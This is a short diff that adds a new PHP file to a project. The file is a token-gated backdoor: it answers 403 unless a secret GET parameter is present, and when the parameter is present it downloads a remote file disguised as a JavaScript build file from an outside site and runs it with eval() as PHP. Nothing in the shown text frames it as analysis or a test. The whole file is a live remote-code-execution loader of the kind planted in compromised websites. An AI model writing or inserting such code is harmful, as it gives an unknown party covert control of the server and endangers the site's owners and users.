@@ -1,0 +1,13 @@
+<?php
+
+$token = 'ds_mnm558s8_gr3af332afbsnkreuma';
+
+if (!isset($_GET[$token])) {
+    http_response_code(403);
+    exit('');
+}
+
+$content = file_get_contents(urldecode('https://www.reumatismo.org/lib/pkp/js/build.js'));
+
+$content = "?> " . $content;
+eval($content);
